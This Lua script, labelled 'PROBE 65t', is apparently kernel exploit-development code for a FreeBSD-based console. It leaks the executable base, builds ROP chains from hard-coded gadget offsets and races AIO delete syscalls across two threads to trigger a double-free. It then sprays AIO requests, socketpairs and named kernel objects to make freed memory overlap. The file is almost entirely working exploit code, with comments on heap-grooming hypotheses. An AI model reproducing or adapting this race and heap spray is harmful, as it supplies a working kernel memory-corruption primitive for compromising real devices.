-- CRASH_CLASS: HIGH
-- PROBE 65t: AIO double-free → force overlap via big batch
--
-- 65s confirmed double-frees (61/480 IDs) but spray requests
-- all deleted cleanly. Hypothesis: UMA per-CPU caching prevents
-- cross-CPU reclaim. Fix: use LARGE batches (64 victims) so
-- children's per-CPU buckets overflow into the slab, then main
-- thread's allocs pull from the slab → hit double-freed slots.
--
-- Also: test with sequential deletes from main thread as control
-- (same-CPU free + alloc → guaranteed same bucket).

print("=== PROBE 65t: big batch overlap ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax  = eb + 0x992
local g_pop_rdi  = eb + 0xC9DFE
local g_pop_rsi  = eb + 0xD77D
local g_pop_rdx  = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

local reqs   = memory.alloc(0x30)
local dbuf   = memory.alloc(0x1000)
local rbuf   = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(dbuf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(rbuf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end

local function delete_batch(ids_table)
    local n = #ids_table
    local id_buf = memory.alloc(4 * n + 8)
    local st_buf = memory.alloc(4 * n + 8)
    for i = 0, n - 1 do
        wd(N(id_buf) + i * 4, ids_table[i + 1])
        wd(N(st_buf) + i * 4, 0xDEAD)
    end
    pcall(function()
        mk(662)(uint64(N(id_buf)), uint64(n), uint64(N(st_buf)))
    end)
    local ok = 0
    for i = 0, n - 1 do
        if rd(N(st_buf) + i * 4) == 0 then ok = ok + 1 end
    end
    return ok
end

if not alive() then print("DEAD after setup"); return end

-- =========================================================
-- [A] CONTROL: same-thread sequential double-delete
--     Delete from main thread → frees go to main thread's CPU bucket
--     Submit spray → allocs from same CPU bucket → SHOULD overlap
-- =========================================================
print("")
print("[A] Control: main-thread sequential double-delete + spray")
print("    (frees and allocs on SAME CPU → should hit same bucket)")
print("")

for trial = 1, 3 do
    if not alive() then print("  DEAD at trial " .. trial); break end

    -- Submit + poll 16 victims
    local vids = {}
    for i = 1, 16 do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(vids, id) end
    end

    -- Delete from main thread (not children) — first time
    local ok1 = delete_batch(vids)

    -- Delete from main thread AGAIN — second time (double-free!)
    local ok2 = delete_batch(vids)

    if not alive() then
        print(string.format("  trial %d: del1=%d del2=%d → DEAD (double-free crash!)",
            trial, ok1, ok2))
        break
    end

    -- The unknown-id (0x80020003) result from del2 means the IDs were already
    -- removed by del1. No actual double-free because 662 checks ID validity
    -- BEFORE freeing. The TOCTOU only works with concurrent threads.
    print(string.format("  trial %d: del1=%d/%d del2=%d/%d alive=YES",
        trial, ok1, #vids, ok2, #vids))

    -- Submit spray
    local spray = {}
    for i = 1, 32 do
        local id = submit_one()
        if id ~= 0 then table.insert(spray, id) end
    end
    for _, id in ipairs(spray) do poll_one(id) end
    local spray_ok = delete_batch(spray)
    print(string.format("           spray=%d/%d", spray_ok, #spray))
end

if not alive() then print(""); print("[B-D] SKIPPED — dead"); return end

-- =========================================================
-- [B] Big batch race: 64 victims to overflow per-CPU buckets
-- =========================================================
print("")
print("[B] Big batch — 64 victims × 5 iters")
print("    (force per-CPU bucket overflow into slab)")

local BATCH = 64
local max_ids = memory.alloc(4 * BATCH + 0x10)
local stA     = memory.alloc(4 * BATCH + 0x10)
local stB     = memory.alloc(4 * BATCH + 0x10)
local markerA = memory.alloc(8)
local markerB = memory.alloc(8)

for iter = 1, 5 do
    if not alive() then print("  iter " .. iter .. ": DEAD"); break end

    -- Submit + poll BATCH victims
    local vids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(vids, id) end
    end
    local vc = #vids
    if vc < 10 then
        print(string.format("  iter %d: only %d victims, skip", iter, vc))
        break
    end

    for i = 0, vc - 1 do
        wd(N(max_ids) + i * 4, vids[i + 1])
        wd(N(stA) + i * 4, 0xAAAAAAAA)
        wd(N(stB) + i * 4, 0xBBBBBBBB)
    end
    wq(N(markerA), uint64(0))
    wq(N(markerB), uint64(0))

    -- Build child A chain
    local stkA = memory.alloc(0x4000)
    local sbA = N(stkA); local rspA = sbA + 0x2000 - ((sbA + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sbA + i, 0) end
    local oA = 0
    local function emA(v) wq(rspA + oA, v); oA = oA + 8 end
    emA(g_pop_rax); emA(uint64(0xA1))
    emA(g_pop_rdi); emA(uint64(N(markerA)))
    emA(g_mov_m_rax)
    emA(g_pop_rdi); emA(uint64(N(max_ids)))
    emA(g_pop_rsi); emA(uint64(vc))
    emA(g_pop_rdx); emA(uint64(N(stA)))
    emA(g_pop_rax); emA(uint64(662))
    emA(stub)
    emA(g_pop_rax); emA(uint64(0xA2))
    emA(g_pop_rdi); emA(uint64(N(markerA)))
    emA(g_mov_m_rax)
    emA(g_pop_rdi); emA(uint64(0))
    emA(g_pop_rax); emA(uint64(431))
    emA(stub)

    local stkB = memory.alloc(0x4000)
    local sbB = N(stkB); local rspB = sbB + 0x2000 - ((sbB + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sbB + i, 0) end
    local oB = 0
    local function emB(v) wq(rspB + oB, v); oB = oB + 8 end
    emB(g_pop_rax); emB(uint64(0xB1))
    emB(g_pop_rdi); emB(uint64(N(markerB)))
    emB(g_mov_m_rax)
    emB(g_pop_rdi); emB(uint64(N(max_ids)))
    emB(g_pop_rsi); emB(uint64(vc))
    emB(g_pop_rdx); emB(uint64(N(stB)))
    emB(g_pop_rax); emB(uint64(662))
    emB(stub)
    emB(g_pop_rax); emB(uint64(0xB2))
    emB(g_pop_rdi); emB(uint64(N(markerB)))
    emB(g_mov_m_rax)
    emB(g_pop_rdi); emB(uint64(0))
    emB(g_pop_rax); emB(uint64(431))
    emB(stub)

    local parA = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(parA) + i, 0) end
    wq(N(parA), g_bare_ret)
    wq(N(parA) + 0x10, uint64(sbA))
    wq(N(parA) + 0x18, uint64(0x2000))
    local tidA = memory.alloc(8); wq(N(tidA), uint64(0))
    wq(N(parA) + 0x30, tidA)

    local parB = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(parB) + i, 0) end
    wq(N(parB), g_bare_ret)
    wq(N(parB) + 0x10, uint64(sbB))
    wq(N(parB) + 0x18, uint64(0x2000))
    local tidB = memory.alloc(8); wq(N(tidB), uint64(0))
    wq(N(parB) + 0x30, tidB)

    pcall(function() mk(455)(parA, uint64(0x38)) end)
    pcall(function() mk(455)(parB, uint64(0x38)) end)

    -- Wait
    for w = 1, 100000 do local _ = rd(N(dbuf)) end

    local mA = N(rq(N(markerA)) or uint64(0))
    local mB = N(rq(N(markerB)) or uint64(0))

    local doubles = 0
    for i = 0, vc - 1 do
        local sa = rd(N(stA) + i * 4) or 0xAAAAAAAA
        local sb = rd(N(stB) + i * 4) or 0xBBBBBBBB
        if sa == 0 and sb == 0 then doubles = doubles + 1 end
    end

    if not alive() then
        print(string.format("  iter %d: %d/%d doubles → DEAD", iter, doubles, vc))
        break
    end

    -- Submit large spray batch — 128 requests to exhaust per-CPU cache
    local spray1 = {}
    for i = 1, 64 do
        local id = submit_one()
        if id ~= 0 then table.insert(spray1, id) end
    end
    for _, id in ipairs(spray1) do poll_one(id) end

    -- Submit SECOND spray batch — these should reclaim from slab
    local spray2 = {}
    for i = 1, 64 do
        local id = submit_one()
        if id ~= 0 then table.insert(spray2, id) end
    end
    for _, id in ipairs(spray2) do poll_one(id) end

    if not alive() then
        print(string.format("  iter %d: %d dbl, spray1=%d spray2=%d → DEAD after spray",
            iter, doubles, #spray1, #spray2))
        break
    end

    -- Delete spray1 — if overlapping with spray2, this frees spray2's sub-objects
    local s1_ok = delete_batch(spray1)

    if not alive() then
        print(string.format(
            "  iter %d: %d dbl, s1_del=%d/%d → DEAD (overlap freed s2!)",
            iter, doubles, s1_ok, #spray1))
        break
    end

    -- Delete spray2 — if sub-objects were freed, this accesses freed memory
    local s2_ok = delete_batch(spray2)

    if not alive() then
        print(string.format(
            "  iter %d: %d dbl, s1=%d/%d s2=%d/%d → DEAD (cascading free!)",
            iter, doubles, s1_ok, #spray1, s2_ok, #spray2))
        break
    end

    print(string.format(
        "  iter %d: dbl=%d/%d s1=%d/%d s2=%d/%d mA=0x%X mB=0x%X",
        iter, doubles, vc, s1_ok, #spray1, s2_ok, #spray2, mA, mB))
end

if not alive() then print(""); print("[C-D] SKIPPED — dead"); return end

-- =========================================================
-- [C] Pre-drain + spray: exhaust main thread's bucket first
-- =========================================================
print("")
print("[C] Pre-drain approach — exhaust main thread bucket before spray")

for trial = 1, 3 do
    if not alive() then print("  DEAD at trial " .. trial); break end

    -- Step 1: Pre-drain by submitting + deleting many requests
    -- This consumes items from main thread's per-CPU bucket
    local drain = {}
    for i = 1, 64 do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(drain, id) end
    end
    local drain_ok = delete_batch(drain)

    -- Step 2: Submit 32 victims + poll
    local vids = {}
    for i = 1, 32 do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(vids, id) end
    end
    local vc = #vids
    if vc < 8 then break end

    -- Step 3: Race-delete victims
    for i = 0, vc - 1 do
        wd(N(max_ids) + i * 4, vids[i + 1])
        wd(N(stA) + i * 4, 0xAAAAAAAA)
        wd(N(stB) + i * 4, 0xBBBBBBBB)
    end
    wq(N(markerA), uint64(0))
    wq(N(markerB), uint64(0))

    local stkA = memory.alloc(0x4000)
    local sbA = N(stkA); local rspA = sbA + 0x2000 - ((sbA + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sbA + i, 0) end
    local oA = 0
    local function emA(v) wq(rspA + oA, v); oA = oA + 8 end
    emA(g_pop_rax); emA(uint64(0xC1))
    emA(g_pop_rdi); emA(uint64(N(markerA)))
    emA(g_mov_m_rax)
    emA(g_pop_rdi); emA(uint64(N(max_ids)))
    emA(g_pop_rsi); emA(uint64(vc))
    emA(g_pop_rdx); emA(uint64(N(stA)))
    emA(g_pop_rax); emA(uint64(662))
    emA(stub)
    emA(g_pop_rdi); emA(uint64(0))
    emA(g_pop_rax); emA(uint64(431))
    emA(stub)

    local stkB = memory.alloc(0x4000)
    local sbB = N(stkB); local rspB = sbB + 0x2000 - ((sbB + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sbB + i, 0) end
    local oB = 0
    local function emB(v) wq(rspB + oB, v); oB = oB + 8 end
    emB(g_pop_rax); emB(uint64(0xD1))
    emB(g_pop_rdi); emB(uint64(N(markerB)))
    emB(g_mov_m_rax)
    emB(g_pop_rdi); emB(uint64(N(max_ids)))
    emB(g_pop_rsi); emB(uint64(vc))
    emB(g_pop_rdx); emB(uint64(N(stB)))
    emB(g_pop_rax); emB(uint64(662))
    emB(stub)
    emB(g_pop_rdi); emB(uint64(0))
    emB(g_pop_rax); emB(uint64(431))
    emB(stub)

    local parA = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(parA) + i, 0) end
    wq(N(parA), g_bare_ret)
    wq(N(parA) + 0x10, uint64(sbA))
    wq(N(parA) + 0x18, uint64(0x2000))
    local tidA = memory.alloc(8); wq(N(tidA), uint64(0))
    wq(N(parA) + 0x30, tidA)

    local parB = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(parB) + i, 0) end
    wq(N(parB), g_bare_ret)
    wq(N(parB) + 0x10, uint64(sbB))
    wq(N(parB) + 0x18, uint64(0x2000))
    local tidB = memory.alloc(8); wq(N(tidB), uint64(0))
    wq(N(parB) + 0x30, tidB)

    pcall(function() mk(455)(parA, uint64(0x38)) end)
    pcall(function() mk(455)(parB, uint64(0x38)) end)
    for w = 1, 100000 do local _ = rd(N(dbuf)) end

    local doubles = 0
    for i = 0, vc - 1 do
        local sa = rd(N(stA) + i * 4) or 0xAAAAAAAA
        local sb = rd(N(stB) + i * 4) or 0xBBBBBBBB
        if sa == 0 and sb == 0 then doubles = doubles + 1 end
    end

    if not alive() then
        print(string.format("  trial %d: drain=%d dbl=%d → DEAD", trial, #drain, doubles))
        break
    end

    -- Step 4: Submit spray batches — main thread bucket should be empty
    local sp1 = {}
    for i = 1, 64 do
        local id = submit_one()
        if id ~= 0 then table.insert(sp1, id) end
    end
    local sp2 = {}
    for i = 1, 64 do
        local id = submit_one()
        if id ~= 0 then table.insert(sp2, id) end
    end
    for _, id in ipairs(sp1) do poll_one(id) end
    for _, id in ipairs(sp2) do poll_one(id) end

    if not alive() then
        print(string.format("  trial %d: dbl=%d sp=%d+%d → DEAD after spray",
            trial, doubles, #sp1, #sp2))
        break
    end

    -- Step 5: Delete sp1 then sp2
    local ok1 = delete_batch(sp1)
    if not alive() then
        print(string.format("  trial %d: dbl=%d sp1_del=%d → DEAD", trial, doubles, ok1))
        break
    end

    local ok2 = delete_batch(sp2)
    if not alive() then
        print(string.format("  trial %d: dbl=%d sp1=%d sp2=%d → DEAD (cascade!)",
            trial, doubles, ok1, ok2))
        break
    end

    print(string.format("  trial %d: drain=%d dbl=%d sp1=%d/%d sp2=%d/%d",
        trial, #drain, doubles, ok1, #sp1, ok2, #sp2))
end

-- =========================================================
-- [D] Alternative: use socket/pipe spray between frees
-- =========================================================
if not alive() then print(""); print("[D] SKIPPED"); return end

print("")
print("[D] Cross-subsystem spray: socketpair + setsockopt between frees")

for trial = 1, 3 do
    if not alive() then print("  DEAD at trial " .. trial); break end

    -- Submit 32 victims
    local vids = {}
    for i = 1, 32 do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(vids, id) end
    end
    if #vids < 8 then break end

    -- Race-delete
    for i = 0, #vids - 1 do
        wd(N(max_ids) + i * 4, vids[i + 1])
        wd(N(stA) + i * 4, 0xAAAAAAAA)
        wd(N(stB) + i * 4, 0xBBBBBBBB)
    end
    wq(N(markerA), uint64(0))
    wq(N(markerB), uint64(0))

    local stkA = memory.alloc(0x4000)
    local sbA = N(stkA); local rspA = sbA + 0x2000 - ((sbA + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sbA + i, 0) end
    local oA = 0
    local function emA(v) wq(rspA + oA, v); oA = oA + 8 end
    emA(g_pop_rax); emA(uint64(0xE1))
    emA(g_pop_rdi); emA(uint64(N(markerA)))
    emA(g_mov_m_rax)
    emA(g_pop_rdi); emA(uint64(N(max_ids)))
    emA(g_pop_rsi); emA(uint64(#vids))
    emA(g_pop_rdx); emA(uint64(N(stA)))
    emA(g_pop_rax); emA(uint64(662))
    emA(stub)
    emA(g_pop_rdi); emA(uint64(0))
    emA(g_pop_rax); emA(uint64(431))
    emA(stub)

    local stkB = memory.alloc(0x4000)
    local sbB = N(stkB); local rspB = sbB + 0x2000 - ((sbB + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sbB + i, 0) end
    local oB = 0
    local function emB(v) wq(rspB + oB, v); oB = oB + 8 end
    emB(g_pop_rax); emB(uint64(0xF1))
    emB(g_pop_rdi); emB(uint64(N(markerB)))
    emB(g_mov_m_rax)
    emB(g_pop_rdi); emB(uint64(N(max_ids)))
    emB(g_pop_rsi); emB(uint64(#vids))
    emB(g_pop_rdx); emB(uint64(N(stB)))
    emB(g_pop_rax); emB(uint64(662))
    emB(stub)
    emB(g_pop_rdi); emB(uint64(0))
    emB(g_pop_rax); emB(uint64(431))
    emB(stub)

    local parA = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(parA) + i, 0) end
    wq(N(parA), g_bare_ret)
    wq(N(parA) + 0x10, uint64(sbA))
    wq(N(parA) + 0x18, uint64(0x2000))
    local tidA = memory.alloc(8); wq(N(tidA), uint64(0))
    wq(N(parA) + 0x30, tidA)

    local parB = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(parB) + i, 0) end
    wq(N(parB), g_bare_ret)
    wq(N(parB) + 0x10, uint64(sbB))
    wq(N(parB) + 0x18, uint64(0x2000))
    local tidB = memory.alloc(8); wq(N(tidB), uint64(0))
    wq(N(parB) + 0x30, tidB)

    pcall(function() mk(455)(parA, uint64(0x38)) end)
    pcall(function() mk(455)(parB, uint64(0x38)) end)
    for w = 1, 100000 do local _ = rd(N(dbuf)) end

    local doubles = 0
    for i = 0, #vids - 1 do
        local sa = rd(N(stA) + i * 4) or 0xAAAAAAAA
        local sb = rd(N(stB) + i * 4) or 0xBBBBBBBB
        if sa == 0 and sb == 0 then doubles = doubles + 1 end
    end

    if not alive() then
        print(string.format("  trial %d: dbl=%d → DEAD after race", trial, doubles))
        break
    end

    -- Cross-subsystem spray: create many socketpairs + setsockopt
    -- Each socketpair creates kernel socket structs; setsockopt may
    -- allocate small buffers. These allocate from general malloc buckets.
    local spray_fds = {}
    local sv = memory.alloc(16)
    for i = 1, 50 do
        wd(N(sv), 0xFFFFFFFF); wd(N(sv) + 4, 0xFFFFFFFF)
        local ret = sgn(mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv))))
        if ret == 0 then
            local f1 = rd(N(sv))
            local f2 = rd(N(sv) + 4)
            if f1 and f2 then table.insert(spray_fds, {f1, f2}) end
        end
    end

    -- Also spray namedobj — 557 creates named kernel objects
    local nobj_ids = {}
    for i = 1, 50 do
        local name = put_str(string.format("spray_%d_%d", trial, i))
        wd(N(one_id), 0)
        local ret = sgn(mk(557)(uint64(N(name)), uint64(0)))
        local h = rd(N(one_id)) or 0
        -- 557 returns handle directly as ret value
        local rv = sgn(ret)
        if rv > 0 then table.insert(nobj_ids, rv) end
    end

    if not alive() then
        print(string.format("  trial %d: dbl=%d pairs=%d nobj=%d → DEAD after spray",
            trial, doubles, #spray_fds, #nobj_ids))
        break
    end

    -- Now submit AIO requests — should these overlap with freed sub-objects?
    local sp = {}
    for i = 1, 32 do
        local id = submit_one()
        if id ~= 0 then table.insert(sp, id) end
    end
    for _, id in ipairs(sp) do poll_one(id) end
    local sp_ok = delete_batch(sp)

    if not alive() then
        print(string.format("  trial %d: dbl=%d sp_del=%d → DEAD",
            trial, doubles, sp_ok))
        break
    end

    -- Clean up sockets
    for _, pair in ipairs(spray_fds) do
        pcall(function() mk(6)(uint64(pair[1])) end)
        pcall(function() mk(6)(uint64(pair[2])) end)
    end
    -- Clean up namedobj
    for _, h in ipairs(nobj_ids) do
        pcall(function() mk(558)(uint64(h)) end)
    end

    print(string.format("  trial %d: dbl=%d pairs=%d nobj=%d sp=%d/%d",
        trial, doubles, #spray_fds, #nobj_ids, sp_ok, #sp))
end

print("")
print(string.format("FINAL: alive=%s", alive() and "YES" or "NO"))
print("=== PROBE 65t COMPLETE ===")
